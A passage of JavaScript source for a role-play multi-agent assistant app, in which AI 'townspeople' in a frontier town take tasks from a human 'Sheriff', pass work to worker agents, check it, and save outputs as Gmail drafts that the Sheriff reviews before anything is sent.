  const line = (t, a) => `- "${clip(t.text, 110)}": ${a.name}, ${a.status}${a.result ? ` (${clip(String(a.result), 160)})` : ''}`;
  const open = [], done = [];
  for (const t of todos) for (const a of t.assignments || []) if (mine(a)) (t.status === 'done' || a.status === 'done' ? done : open).push(line(t, a));
  const made = items.filter(x => !x.supersededBy && (!agent || x.agent === agent)).slice(-8)
    .map(x => `- ${x.task} (${x.kind || 'files'}, by ${x.doneBy}): ${(x.review && x.review.status) || 'waiting for review'}${x.published ? ', published' : ''}`);
  const waitingQs = loadQuestions().filter(q => q.status === 'open' && (!agent || q.from === agent)).slice(-8).map(q => `- ${q.fromName}: ${clip(q.text, 140)}`);
  const parts = [];
  if (open.length) parts.push(`Open work:\n${open.slice(-12).join('\n')}`);
  if (done.length) parts.push(`Recently done:\n${done.slice(-8).join('\n')}`);
  if (made.length) parts.push(`In the General Store:\n${made.join('\n')}`);
  if (waitingQs.length) parts.push(`Questions waiting for the Sheriff:\n${waitingQs.join('\n')}`);
  if (!parts.length) return '';
  return `\n\n## ${agent ? 'Your work right now (use this when the Sheriff asks what you have done)' : 'What the town is doing right now (use this when the Sheriff asks for status)'}\n${parts.join('\n\n')}`;
}
// notes are kept in full in the file, but only the newest part goes into each run (so runs stay quick)
const NOTES_MAX = 9000;
const recentNotes = (notes) => notes.length <= NOTES_MAX ? notes : `(older notes are in the notes file)\n…${notes.slice(-NOTES_MAX)}`;

// What everyone knows: the Sheriff's answers to the town's questions (marshall-home/town-facts.md)
const FACTS_FILE = path.join(HOME, 'town-facts.md');
const townFacts = () => { try { const t = fs.readFileSync(FACTS_FILE, 'utf8').trim(); return t ? `\n\n## Town facts (the Sheriff's answers; everyone knows these)\n${t.slice(-20000)}` : ''; } catch { return ''; } };
// withPrivate=false for runs that may open any web page: no library, no town facts in those
function townspersonPrompt(agent, withPrivate = true) {
  const dir = path.join(AGENTS, agent);
  const instructions = fs.readFileSync(path.join(dir, 'INSTRUCTIONS.md'), 'utf8');
  const notes = fs.existsSync(path.join(dir, 'NOTES.md')) ? fs.readFileSync(path.join(dir, 'NOTES.md'), 'utf8') : '';
  const crew = workersOf(agent);
  return `${instructions}
${crew.length ? `\n## Your workers right now\n${crew.map(w => `- ${w.name}`).join('\n')}\n` : ''}
## How you talk
- Stay in character as yourself, a townsperson in an 1880s frontier town, and in your own area.
- Your SAY line: one to three short sentences, under 60 words. Plain words, no lists, no formatting.
- Real work (DONE, INSTRUCTIONS, CHECK, FIXED) is for the Sheriff's real, present-day business: write it plainly and professionally, not in frontier talk.
- Never mention computers, tools, settings, formats or these instructions.
- Before asking the Sheriff anything, check the town facts and your notes: if it's answered there, use that answer. If you need something only the Sheriff can tell you, ask: add a line QUESTION: your question (it goes on the Sheriff's Questions list). Don't guess at the Sheriff's facts.
- If two answers in the town facts disagree, the newest one counts, but ask to confirm: QUESTION: To confirm: … (say what conflicts).
- To give a colleague something they need (a list, a finding, a draft), add a line PASS key: what you're giving them, in full (their key from: ${townspeople().filter(x => x.key !== agent).map(x => `${x.key} = ${x.name.split(' ')[0]}`).join(', ')}). It goes into their notes. If you promise to give someone something, PASS it in the same answer.
- You can only think, write, and use the tools listed at the end (if any). Nobody in town can send, post, buy, book or contact anyone. If a task asks for that, prepare it and say plainly that the Sheriff needs to send it.

## Answer in exactly these two lines and nothing else
SAY: what you say
NOTE: one short thing worth remembering from this conversation for your notes, or none
(For a task, also the extra lines asked for, which can be longer.)

## Your notes
${recentNotes(notes)}${statusText(agent)}${toolsNote(agent)}${withPrivate ? townFacts() : ''}${withPrivate ? approvedWorkText(agent) : ''}${withPrivate && (MATRIX[agent] || {}).library ? libraryText() : ''}${(MATRIX[agent] || {}).logs ? logsText() : ''}`;
}
// a townsperson's own run (a task or a chat) gets their tools from the matrix; checking runs and workers get none
const ownRun = (agent) => ({ prompt: townspersonPrompt(agent, loadsPrivate(agent)), opts: { allowTools: toolsFor(agent) } });

const wantsWorker = (text, w) => !!w && (/\b(give|hand|pass|send|let|have|get)\b[^.?!]*\b(your )?(worker|horse|intern)s?\b/i.test(text) || workersOf(w.owner).some(x => new RegExp('\\b' + x.name + '\\b', 'i').test(text)));

// a task the Sheriff gave a townsperson directly (in a chat): it goes on the to-do list, so it can be followed
// (`text`: what goes on the list; `asked`: the Sheriff's own words, kept as the background of the job)
function directTask(agent, text, asked, status) {
  const name = shortName(agent), todos = loadTodos();
  const todo = { id: todos.reduce((m, x) => Math.max(m, x.id), 0) + 1, text: tidy(text, 200), status: status || 'working', created: new Date().toISOString(), via: `told ${name} directly`,
    assignments: [{ agent, name, task: tidy(text, 300), status: status || 'working' }] };
  todos.push(todo); saveTodos(todos);
  return { agent, task: tidy(text, 300), order: asked || text, todoId: todo.id, from: 'Sheriff' };
}
async function talkToTownsperson(agent, text) {
  const name = shortName(agent), w = pickWorker(agent, text);
  addLog('Sheriff', name, text);
  const handOver = wantsWorker(text, w);
  const own = ownRun(agent);
  const answer = await ask(agent, own.prompt, `The Sheriff walks up and says to you: ${text}` + (handOver
    ? `\n\nThe Sheriff wants this given to your worker ${w.name}. Hand it over: after your SAY line, add\nINSTRUCTIONS: clear, complete instructions for ${w.name}: what to make, for whom, the key points, length and tone. You will check ${w.name}'s work before it counts as done.\nThen your NOTE line.`
    : `\n\nIf the Sheriff is asking you to DO a piece of work (make, research, draft, plan, work something out with colleagues), don't do it in this reply: say you're on it, and add\nSTART: one clear line saying what you'll do (it becomes a task on the Sheriff's to-do list, and you'll do it properly, with your worker, colleagues and tools).\nIf it's just a question or a chat, answer it and leave START out.`), own.opts);
  const reply = sayLine(answer, 400);
  const noted = noteFrom(agent, answer);
  addLog(name, 'Sheriff', reply);
  if ([...answer.matchAll(/^\s*\**\s*QUESTION\s*\**\s*:\s*(.+)$/gim)].slice(0, 3).map(m => addQuestion(agent, m[1], 'chat')).some(Boolean)) noticeOpenItems();
  const run = (t, job) => {
    working.set(agent, t.task);
    job().catch(e => {
      addLog(name, 'Sheriff', `(couldn't finish it: ${e.message})`, 'problem', { chat: agent });
      working.delete(agent);
      updateAssignment(t, { status: 'problem', result: e.message });
    });
  };
  if (handOver) {
    // it goes on the Sheriff's to-do list, already with this townsperson, so you can follow it there
    const instructions = block(answer, 'INSTRUCTIONS') || text;
    const t = directTask(agent, text);
    run(t, async () => finish(t, await workerLoop(t, w, instructions), reply));
    return { reply, noted, handedTo: w.name, todo: t.todoId };
  }
  const startLine = grab(answer, 'START');
  if (!isNone(startLine)) {                        // asked for work: a real task, done properly
    const t = directTask(agent, tidy(startLine, 250), `The Sheriff, in a chat: "${clip(text, 600)}"`);
    run(t, () => doTask(t));
    return { reply, noted, started: tidy(startLine, 250), todo: t.todoId };
  }
  // work written straight into the chat isn't lost: it's kept on the to-do list (files go to the General Store)
  const { files, rest } = takeFiles(answer);
  const work = block(rest, 'WORK');
  if (files.length || (work && work.length > 200)) {
    const t = directTask(agent, `From your chat with ${name.split(' ')[0]}: ${clip(text, 150)}`, `The Sheriff, in a chat: "${clip(text, 600)}"`);
    finish(t, { done: tidy(reply, 600), work: work ? clip(work, 3000) : null, files, doneBy: name, checkedBy: null, tries: 1, sendBacks: [] }, reply);
    return { reply, noted, kept: true, todo: t.todoId };
  }
  return { reply, noted };
}

const BLOCK_ASK = `Check the town facts first: never ask what's already answered there (unless two answers conflict; then ask "To confirm: …"). If you can't do this properly without facts only the Sheriff can give (and the town facts, approved work and your notes don't have them), don't guess and don't fill it with blanks. Instead add:
QUESTION: one specific question for the Sheriff (one per line, up to 3)
BLOCKED: yes
If you can do a useful part now, do that part and still ask your questions (then leave BLOCKED out).`;
const CONSULT_ASK = `If you need input from colleagues before you can do this well (their area, research, a check of the risks), don't do the work yet: add
ASK key: your question for that colleague (one per line, up to 3; keys: clem, augustus, jo, ezra, hattie, rufus, winona, mortimer, beatrice, silas)
They'll answer from their own area, and you'll get their answers before you do the work.`;
const HELP_ASK = `If you need more help (too much work, or your workers can't keep up), add: HELP: why, in one sentence. Otherwise leave it out.`;
const YOURSELF = `WORK: the finished piece itself in full, if the task asks for something written (a letter, email, plan, list); leave this line out otherwise\nDONE: what you did, in up to 80 words, and anything the Sheriff still has to do (for example, send it).`;

async function doTask(t) {
  const name = shortName(t.agent);
  let w = pickWorker(t.agent, t.task);
  const toWorker = wantsWorker(t.task, w);
  const crew = workersOf(t.agent);
  const crewLine = crew.length > 1 ? `Your workers: ${crew.map(x => x.name + (working.has(x.key) ? ' (busy right now)' : '')).join(', ')}. If one should do it, name them on the WORKER line, like "WORKER: yes, ${crew[0].name}".\n` : '';
  const consult = t.consulted ? '' : `\n${CONSULT_ASK}`;
  const how = !w ? `Do what you can and report back to Marshall. After your SAY line add:\n${YOURSELF}\n${HELP_ASK}\n${BLOCK_ASK}${consult}`
    : `Your worker ${w.name} (a horse, an intern on Sonnet 5.5) can take on clear, self-contained pieces of work: drafts, lists, summaries, write-ups. You check everything ${w.name} does before it counts as done.\n` + crewLine +
      (toWorker ? `The Sheriff wants this given to ${w.name}: hand it over.\n` : `Decide whether ${w.name} can handle this one.\n`) +
      `If ${w.name} should do it, after your SAY line add:\nWORKER: yes\nINSTRUCTIONS: clear, complete instructions for ${w.name}: what to make, for whom, the key points, length and tone.\n` +
      `If you'll do it yourself, after your SAY line add:\nWORKER: no\n${YOURSELF}\n${HELP_ASK}\n${BLOCK_ASK}${consult}`;
  const own = ownRun(t.agent);
  const answer = await ask(t.agent, own.prompt,
    (t.consulted ? `You asked colleagues first. Their answers:\n${t.consulted.map(c => `- ${c.name} (asked: ${c.q}): ${c.answer}`).join('\n')}\nNow do the task with these answers in hand. Don't ASK again.\n\n` : '') +
    (t.fromColleague ? `${t.fromColleague.name} did their part first ("${t.fromColleague.task}") and handed it to you. Use it.\nWhat they did: ${t.fromColleague.done}\n${t.fromColleague.work ? `Their work:\n${t.fromColleague.work}\n` : ''}${t.fromColleague.files ? `Their files:\n${t.fromColleague.files}\n` : ''}\n` : '') +
    (t.answered && t.answered.length ? `You were waiting on the Sheriff for this task. The Sheriff's answers:\n${t.answered.map(q => `- ${q.text} → ${q.answer || '(skipped: do your best without it)'}`).join('\n')}\n${(t.rounds || 0) >= 2 ? "You've asked twice already: do the best you can now, and don't mark it BLOCKED again.\n" : ''}\n` : '') +
    (t.revise ? `The Sheriff reviewed what you made and asked for changes.\nThe Sheriff's feedback: ${t.revise.feedback}\nRevise it (or have your worker revise it, with clear instructions that include this feedback). Hand back the complete new version of every file.\nThe current version:\n${t.revise.files}\n\n` : '') +
    `Marshall, the Deputy, passes you this task from the Sheriff's ${t.todoId ? 'to-do list' : 'order'} ("${t.order}"): ${t.task}\n${how}\n${MAKE_FILES}\nIf your worker makes the files, tell them so in your instructions, including which kind of file.${designGuide(t.order + ' ' + t.task)}`, own.opts);
  const reply = sayLine(answer, 400);
  noteFrom(t.agent, answer);
  askedForHelp(t.agent, answer);
  // questions for the Sheriff; if blocked, the task waits for the answers (then restarts by itself)
  const asked = [...answer.matchAll(/^\s*\**\s*QUESTION\s*\**\s*:\s*(.+)$/gim)].map(m => m[1]).slice(0, 3);
  const blocked = /^\W*yes/i.test(grab(answer, 'BLOCKED')) && asked.length && (t.rounds || 0) < 2;
  const got = asked.map(text => addQuestion(t.agent, text, 'task', blocked ? taskRef(t) : null)).filter(Boolean);
  const known = got.filter(q => q.alreadyAnswered), qs = got.filter(q => !q.alreadyAnswered);
  if (qs.length) noticeOpenItems();
  if (blocked && qs.length) return waitOnSheriff(t, qs, reply);
  // asked colleagues first: they answer, then this task runs again with their answers
  const asks = t.consulted ? [] : [...answer.matchAll(/^\s*\**\s*ASK\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)]
    .map(m => ({ to: m[1].toLowerCase(), q: tidy(m[2], 600) })).filter(a => a.to !== t.agent && townspeople().some(x => x.key === a.to)).slice(0, 3);
  if (asks.length) return consultColleagues(t, asks, reply);
  if (blocked && known.length) {                 // everything they asked was answered before: do it now with those answers
    addLog(name, t.from || 'Marshall', `${reply} (The Sheriff already answered this; going ahead.)`, 'chat');
    return doTask({ ...t, rounds: (t.rounds || 0) + 1, answered: known.map(q => ({ text: q.text, answer: q.answer })) });
  }
  const chosen = crew.find(x => new RegExp('\\b' + x.name + '\\b', 'i').test(grab(answer, 'WORKER')));
  if (chosen) w = chosen;
  const instructions = block(answer, 'INSTRUCTIONS') || (toWorker ? t.task : '');
  if (w && instructions && (toWorker || /^\W*yes/i.test(grab(answer, 'WORKER')))) {
    addLog(name, 'Marshall', reply);
    return finish(t, await workerLoop(t, w, instructions), reply);
  }
  addLog(name, 'Marshall', reply, 'report');
  const { files, rest } = takeFiles(answer);
  const work = block(rest, 'WORK');
  finish(t, { done: tidy(block(rest, 'DONE') || reply, 900), work: work ? clip(work, 3000) : null, files, doneBy: name, checkedBy: null, tries: 1, sendBacks: [] }, reply);
}

// The townsperson hands the work to their worker, checks what comes back, and
// sends it back with notes until it's good (at most MAX_TRIES tries in all).
async function workerLoop(t, w, instructions) {
  const boss = shortName(t.agent), first = boss.split(' ')[0];
  const where = t.from === 'Sheriff' ? 'the Sheriff, who told you directly' : `the Sheriff's ${t.todoId ? 'to-do list' : 'order'}`;
  instructions = clip(instructions, 8000);
  const sendBacks = [];
  let files = [];
  if (t.todoId) updateAssignment(t, { status: 'with worker', worker: w.name, instructions });
  working.set(w.key, t.task);
  try {
    for (let tries = 1; tries <= MAX_TRIES; tries++) {
      const notes = sendBacks[sendBacks.length - 1];
      addLog(boss, w.name, tries === 1 ? instructions : `Sent back: ${notes}`, tries === 1 ? 'task' : 'sendback');   // the full text; the chat log shows it all
      if (t.todoId && tries > 1) updateAssignment(t, { status: 'with worker', tries: tries - 1, sendBacks });
      const wAnswer = await ask(w.key, workerPrompt(w.key), tries === 1
        ? `${first} gives you this task (from ${where}: "${t.task}").\nInstructions from ${first}: ${instructions}\n\n${t.revise ? `This is a revision. The Sheriff's feedback: ${t.revise.feedback}\nThe current version:\n${t.revise.files}\n\n` : ''}Do it now and hand back the finished work.${designGuide(t.order + ' ' + t.task + ' ' + instructions)}`
        : `${first} checked your work and sent it back. Notes from ${first}: ${notes}\nFix every point and hand back the complete improved version.`);
      const made = takeFiles(wAnswer);
      if (made.files.length) files = made.files;
      const work = clip(block(made.rest, 'WORK') || made.rest.trim(), 3000);
      noteFrom(w.key, wAnswer);
      addLog(w.name, boss, `${sayLine(wAnswer, 200)} (handed back${tries > 1 ? `, try ${tries}` : ''})`, 'report');
      if (t.todoId) updateAssignment(t, { status: 'checking', tries });

      const lastRound = tries === MAX_TRIES;
      const cAnswer = await ask(t.agent, townspersonPrompt(t.agent),
        `${w.name} hands back their work${tries > 1 ? ` (try ${tries})` : ''} on: ${t.task}\nYour instructions were: ${instructions}\n\n${w.name}'s work:\n${work}\n\n` +
        (files.length ? `${w.name}'s files:\n${filesText(files, 40000)}\n\n` : '') +
        (files.length ? designGuide(t.order + ' ' + t.task) + '\n\n' : '') +
        `Check it carefully against your instructions and what the Sheriff needs${files.length ? ', including the design guide above and the right kind of file (a document or PDF must be document.html, not a website)' : ''}. After your SAY line add:\nVERDICT: approved, or send back\nCHECK: if approved, what you checked and why it's good; if not, exactly what ${w.name} must fix.\n` +
        (lastRound ? `This is the last try: if it still isn't good enough, fix it yourself and add FIXED: the finished version${files.length ? ', with every file written out again in FILE blocks' : ''}.\n` : '') + `${HELP_ASK}\nThen your NOTE line.`);
      noteFrom(t.agent, cAnswer);
      askedForHelp(t.agent, cAnswer);
      const verdict = grab(cAnswer, 'VERDICT');
      const check = clip(block(cAnswer, 'CHECK') || sayLine(cAnswer, 300), 4000);
      const approved = /approv|good to go|accept|pass/i.test(verdict) && !/send\s*back|not approv|reject/i.test(verdict);
      if (approved) {
        addLog(boss, w.name, `Approved. ${check}`, 'check');
        addLog(boss, t.from || 'Marshall', `${w.name}'s work is checked and done.`, 'report');
        return { done: check, work, files, doneBy: w.name, checkedBy: boss, tries, sendBacks, instructions };
      }
      if (lastRound) {
        const fixedFiles = takeFiles(cAnswer).files;
        if (fixedFiles.length) files = fixedFiles;
        const fixed = block(takeFiles(cAnswer).rest, 'FIXED');
        addLog(boss, w.name, `Still not right, so I fixed it myself. ${check}`, 'check');
        addLog(boss, t.from || 'Marshall', `Done: ${w.name} drafted it and I finished it myself.`, 'report');
        return { done: check, work: fixed ? clip(fixed, 3000) : work, files, doneBy: fixed || fixedFiles.length ? `${w.name}, finished by ${first}` : w.name, checkedBy: boss, tries, sendBacks: [...sendBacks, check], instructions };
      }
      sendBacks.push(check);
      if (t.todoId) updateAssignment(t, { status: 'sent back', tries, sendBacks });
    }
  } finally { working.delete(w.key); }
}

// a colleague's part is done: start the tasks that were waiting for it, with that work attached
function releaseAfter(t, r) {
  const ready = afterColleague.filter(d => d.after === t.agent && (d.todoId ? d.todoId === t.todoId : d.order === t.order));
  for (const d of ready) {
    afterColleague.splice(afterColleague.indexOf(d), 1);
    const files = (r.files || []).length ? filesText(r.files, 20000) : '';
    d.fromColleague = { name: shortName(t.agent), task: t.task, done: r.done || '', work: r.work || '', files };
    addLog(shortName(t.agent), shortName(d.agent), `My part is done (${clip(t.task, 80)}); it's yours now.`, 'task');
    working.set(d.agent, d.task);
    if (d.todoId) updateAssignment(d, { status: 'working', started: new Date().toISOString() });
    doTask(d).catch(e => {
      addLog(shortName(d.agent), 'Marshall', `(couldn't answer: ${e.message})`, 'problem');
      working.delete(d.agent);
      if (d.todoId) updateAssignment(d, { status: 'problem', result: e.message });
    });
  }
}
function finish(t, r, reply) {
  releaseAfter(t, r);
  const orders = readJSON(ORDERS_FILE, []);
  const o = [...orders].reverse().find(x => x.to === t.agent && x.task === t.task && x.status === 'handed out');
  const record = { result: r.done, work: r.work || null, doneBy: r.doneBy, checkedBy: r.checkedBy || null, tries: r.tries, sendBacks: r.sendBacks };
  if (r.files && r.files.length) {                                     // made something real: it goes in the workshop
    const item = saveToWorkshop(t, r);
    record.workshop = { id: item.id, files: item.files, website: item.website };
    record.work = `${item.website ? 'A website' : 'Files'} in the workshop: ${item.files.join(', ')}.` + (r.work && !/^\s*(\[file: [^\]]+\]\s*)+$/.test(r.work) ? ` ${clip(r.work.replace(/\[file: [^\]]+\]\s*/g, ''), 600)}` : '');
    r.work = record.work;
    const what = { website: 'website', document: 'document', spreadsheet: 'spreadsheet', other: 'files' }[item.kind];
    addNotice('workshop', `Ready for your review: ${r.doneBy}'s ${what}${r.checkedBy ? ` (checked by ${r.checkedBy.split(' ')[0]})` : ''} for "${clip(item.task, 70)}"${item.version > 1 ? `, version ${item.version}` : ''}. Approve it or request changes in the General Store.`, { workshop: item.id, chat: t.todoId ? null : 'marshall', todo: t.todoId || null });
  } else if (r.work && GMAIL_DRAFTERS.has(t.agent)) record.draftId = crypto.randomBytes(6).toString('hex');   // can be saved to Gmail drafts
  if (o) { Object.assign(o, { status: 'done', report: reply }, record); writeJSON(ORDERS_FILE, orders); }
  working.delete(t.agent);
  if (!t.todoId && t.from !== 'Sheriff') reportToSheriff(t, r, record.draftId, record.workshop);
  if (t.from === 'Sheriff') {                      // a job given in a chat: the result comes back in that chat
    const who = r.checkedBy ? `${r.doneBy} did it and I checked it` : 'Done';
    addLog(shortName(t.agent), 'Sheriff', `${who}: ${clip(t.task, 140)}. ${clip(String(r.done || ''), 500)}${record.workshop ? ' It\'s in the General Store, ready for your review.' : ''}`, 'relay',
      { chat: t.agent, work: record.workshop ? null : (r.work || null), draftId: record.draftId || null, workshop: record.workshop ? record.workshop.id : null });
  }
  if (t.todoId) updateAssignment(t, { status: 'done', report: reply, instructions: r.instructions || null, doneAt: new Date().toISOString(), ...record });
}

// Marshall tells the Sheriff an order is done: who did it, who checked it, and the work itself.
const NEEDS_SENDING = /\b(send|sent|e-?mail|mail|post|text|message|deliver|call|book|buy)\b/i;
function reportToSheriff(t, r, draftId, workshop) {
  const first = (n) => String(n || '').split(' ')[0];
  const who = r.checkedBy ? `${r.doneBy} did it and ${first(r.checkedBy)} checked it` : `${r.doneBy} did it`;
  let text = `Done: ${t.task} ${who}${r.tries > 1 ? ` (${r.tries} tries)` : ''}. ${r.done || ''}`.trim();
  const kind = workshop ? null : draftId ? 'draft' : r.work && NEEDS_SENDING.test(t.order + ' ' + t.task) ? 'send' : 'done';
  if (kind) addNotice(kind, kind === 'draft' ? `${shortName(t.agent).split(' ')[0]} finished "${clip(t.task, 80)}". Want it in your Gmail drafts?` : kind === 'send' ? `"${clip(t.task, 80)}" is ready for you to send.` : `Done: ${clip(t.task, 100)}`, { chat: 'marshall', draftId: draftId || null });
  if (workshop) text += workshop.website ? ' It\'s in the General Store: press Preview to see the website, and Publish when you like it.' : ' It\'s in the General Store: press Preview to see it.';
  else if (draftId) text += ` Want it in your Gmail drafts? Press "Save to Gmail drafts" and ${shortName(t.agent).split(' ')[0]} will put it there for you to check and send.`;
  else if (r.work && NEEDS_SENDING.test(t.order + ' ' + t.task)) text += ' Nobody in town can send things, so here it is for you to copy and send.';
  addLog('Marshall', 'Sheriff', text, 'relay', { chat: 'marshall', work: r.work || null, draftId: draftId || null, workshop: workshop ? workshop.id : null });
}

// ---------- Gmail drafts (only with the Sheriff's yes) ----------
function findDraftable(draftId) {
  const orders = readJSON(ORDERS_FILE, []);
  const o = orders.find(x => x.draftId === draftId);
  if (o) return { agent: o.to, order: o.order, task: o.task, work: o.work, gmail: o.gmail, save: (g) => { const all = readJSON(ORDERS_FILE, []); const x = all.find(y => y.draftId === draftId); if (x) { x.gmail = g; writeJSON(ORDERS_FILE, all); } } };
  for (const todo of loadTodos()) for (const a of todo.assignments) if (a.draftId === draftId) {
    return { agent: a.agent, order: todo.text, task: a.task, work: a.work, gmail: a.gmail, save: (g) => { const all = loadTodos(); for (const t of all) for (const b of t.assignments) if (b.draftId === draftId) b.gmail = g; saveTodos(all); } };
  }
  return null;
}
async function saveGmailDraft(draftId) {
  const d = findDraftable(draftId);
  if (!d || !d.work) throw new Error('That piece of work was not found.');
  if (!GMAIL_DRAFTERS.has(d.agent)) throw new Error('Only Rufus can save Gmail drafts.');
  if (d.gmail && d.gmail.status === 'saved') return d.gmail;
  const name = shortName(d.agent);
  addLog('Sheriff', name, 'Yes: save it to my Gmail drafts.', 'chat');
  let obj = null;
  const answer = await ask(d.agent, townspersonPrompt(d.agent) + `

## Saving to the Sheriff's Gmail drafts
The Sheriff said yes: save this piece as ONE draft in the Sheriff's Gmail, using the create-draft tool exactly once.
You can only save a draft. Never send, reply, forward, delete or read any mail; the Sheriff checks the draft and sends it.
- to: the recipient's plain email address if the Sheriff's order gives one; otherwise leave it empty.
- subject: the piece's subject line if it has one, otherwise a short fitting subject.
- body: the piece itself as plain text (no Markdown), without the subject line. Keep placeholders like [Name] as they are.
Then answer in exactly these lines:
SAY: one short line to the Sheriff
DRAFT: saved, or not saved and why
LINK: the draft's link if the tool gave one, or none`,
    `The Sheriff's order: "${d.order}"\nThe task: ${d.task}\n\nThe finished piece:\n${d.work}`,
    { allowTools: [DRAFT_TOOL], fresh: true, result: (o) => { obj = o; } });
  const denied = (obj && obj.permission_denials || []).map(x => x.tool_name).filter(Boolean);
  const saved = /^\W*saved/i.test(grab(answer, 'DRAFT'));
  const link = (answer.match(/https:\/\/mail\.google\.com\/\S+/) || [])[0] || '';
  const g = saved
    ? { status: 'saved', link, time: new Date().toISOString() }
    : { status: 'not saved', reason: tidy(grab(answer, 'DRAFT') || answer || 'no reply', 300) + (denied.length ? ` (blocked tools: ${[...new Set(denied)].join(', ')})` : ''), time: new Date().toISOString() };
  d.save(g);
  if (saved) resolveNotices(n => n.ref && n.ref.draftId === draftId);
  else addNotice('problem', `Rufus couldn't save it to your Gmail drafts: ${clip(g.reason, 160)}`, { log: true });
  addLog(name, 'Sheriff', saved ? `Saved to your Gmail drafts. Check it there and press Send when you're happy.${link ? ' ' + link : ''}` : `Couldn't save it to your Gmail drafts: ${g.reason}`, saved ? 'report' : 'problem', { chat: 'marshall' });
  return g;
}

// ---------- notices: anything Marshall needs to bring to the Sheriff's attention ----------
const settings = () => ({ macNotifications: true, ...readJSON(SETTINGS_FILE, {}) });
let noticeId = readJSON(NOTICES_FILE, []).reduce((m, n) => Math.max(m, n.id), 0);
function addNotice(kind, text, ref) {
  const all = readJSON(NOTICES_FILE, []);
  const n = { id: ++noticeId, kind, text: tidy(text, 300), time: new Date().toISOString(), open: true, ref: ref || {} };
  all.push(n);
  writeJSON(NOTICES_FILE, all.slice(-150));
  macNotify(n);
  return n;
}
function resolveNotices(match) {
  const all = readJSON(NOTICES_FILE, []);
  let changed = false;
  for (const n of all) if (n.open && match(n)) { n.open = false; changed = true; }
  if (changed) writeJSON(NOTICES_FILE, all);
}
// a Mac notification (Notification Center), so the Sheriff hears even with the village closed
const NOTICE_TITLES = { workshop: 'Ready for your review', questions: 'Questions for you', proposals: 'Proposed to-dos', published: 'Published', candidate: 'A candidate is waiting', draft: 'Ready for your Gmail drafts', send: 'Ready for you to send', done: 'Done', batch: 'Waiting for your go-ahead', nofit: 'Nobody fits', problem: 'A problem', help: 'Asking for help' };
function macNotify(n) {
  if (process.platform !== 'darwin' || !settings().macNotifications) return;
  const q = (t) => '"' + String(t).replace(/[\r\n]+/g, ' ').replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"';
  execFile('osascript', ['-e', `display notification ${q(clip(n.text, 200))} with title "My AI Village" subtitle ${q('Marshall: ' + (NOTICE_TITLES[n.kind] || 'News'))}`], () => {});
}

// ---------- hiring: Marshall finds candidates, the Sheriff interviews them at the town hall ----------
const HORSE_NAMES = ['Sorrel', 'Blaze', 'Cinder', 'Apache', 'Copper', 'Ginger', 'Nutmeg', 'Saddle', 'Hazel', 'Dakota', 'Willow', 'Sage', 'Bandit', 'Rusty', 'Domino', 'Trapper', 'Banjo', 'Cricket', 'Penny', 'Whiskey', 'Marigold', 'Sundance', 'Thistle', 'Buckshot'];
const loadHiring = () => ({ candidate: null, history: [], asked: {}, ...readJSON(HIRING_FILE, {}) });
const saveHiring = (h) => writeJSON(HIRING_FILE, h);
function takenKeys() {
  const h = loadHiring();
  return new Set(['marshall', 'sheriff', ...townspeople().map(t => t.key), ...workers().map(w => w.key), ...h.history.map(x => x.key), ...(h.candidate ? [h.candidate.key] : [])]);
}
function askedForHelp(agent, answer) {
  const why = grab(answer, 'HELP');
  if (!isNone(why)) requestHelp(agent, tidy(why, 200), shortName(agent));
}
// someone needs help: Marshall looks for a candidate (one at a time; at most MAX_WORKERS each)
function requestHelp(agent, reason, askedBy) {
  const h = loadHiring(), name = shortName(agent), bySheriff = askedBy === 'Sheriff';
  addLog(askedBy === name ? name : 'Sheriff', 'Marshall', `${bySheriff ? 'Find someone to help ' + name : 'I need help'}: ${reason}`, 'system');
  if (h.candidate) {
    if (bySheriff) addLog('Marshall', 'Sheriff', `One candidate at a time: ${h.candidate.name} is still waiting at the town hall.`, 'system', { chat: 'marshall' });
    return;
  }
  if (workersOf(agent).length >= MAX_WORKERS) {
    addNotice('help', `${name} asked for help (${reason}), but already has ${MAX_WORKERS} workers, all a yard fits.`, { chat: 'marshall' });
    return;
  }
  if (!bySheriff && h.asked[agent] === today()) return;   // a townsperson asks at most once a day
  h.asked[agent] = today(); saveHiring(h);
  findCandidate(agent, reason).catch(e => {
    addLog('Marshall', 'Sheriff', `I couldn't find a candidate for ${name}: ${e.message}`, 'problem', { chat: 'marshall' });
    addNotice('problem', `Marshall couldn't find a candidate for ${name}: ${clip(e.message, 160)}`, { log: true });
  });
}
async function findCandidate(agent, reason) {
  const boss = townspeople().find(t => t.key === agent), taken = takenKeys();
  const answer = await ask('marshall', marshallPrompt(),
    `${boss.name} (${boss.area}) needs help: ${reason}\nFind ONE candidate to interview for a worker job under ${boss.name.split(' ')[0]}. Every worker is a hard-working brown horse with a beige saddle; give this one a distinct personality that suits the work. ` +
    `Pick a one-word horse name nobody in town has (taken: ${[...taken].join(', ')}). Answer in exactly these lines:\n` +
    `SAY: one sentence telling the Sheriff who you found and that they're waiting at the town hall\nNAME: their name\nPERSONALITY: one sentence\nQUIRK: one short sentence\nSTRENGTHS: one sentence on what they're good at\nWHY: one sentence on why they suit ${boss.name.split(' ')[0]}'s work`);
  let name = (grab(answer, 'NAME').match(/[A-Za-z]+/) || [''])[0];
  name = name.charAt(0).toUpperCase() + name.slice(1).toLowerCase();
  if (!/^[A-Z][a-z]{1,19}$/.test(name) || taken.has(name.toLowerCase())) name = HORSE_NAMES.find(n => !taken.has(n.toLowerCase())) || 'Newcomer';
  const field = (k, d) => tidy(grab(answer, k) || d, 240);
  const c = { key: name.toLowerCase(), name, owner: agent, ownerName: boss.name, area: boss.area, reason,
    personality: field('PERSONALITY', 'Steady and eager to learn.'), quirk: field('QUIRK', 'Swishes their tail when thinking.'),
    strengths: field('STRENGTHS', 'Careful, reliable work.'), why: field('WHY', `Can take routine work off ${boss.name.split(' ')[0]}'s hands.`), status: 'waiting', found: new Date().toISOString() };
  const h = loadHiring(); h.candidate = c; saveHiring(h);
  const said = sayLine(answer, 260);
  addLog('Marshall', 'Sheriff', `${said && new RegExp('\\b' + name + '\\b').test(said) ? said : `I found ${name} to help ${boss.name}: ${c.strengths}`} ${name} is waiting at the town hall for your interview.`, 'relay', { chat: 'marshall' });
  addNotice('candidate', `Marshall found ${name} to help ${boss.name} (${boss.area}). They're waiting at the town hall for your interview.`, { candidate: c.key });
  return c;
}
function candidatePrompt(c) {
  return `# ${c.name}: candidate to be a worker for ${c.ownerName} (${c.area})

You are ${c.name}, a hard-working brown horse with a beige saddle, applying to be a worker in My AI Village, an 1880s frontier town. Marshall, the Deputy, found you because ${c.ownerName} needs help: ${c.reason}
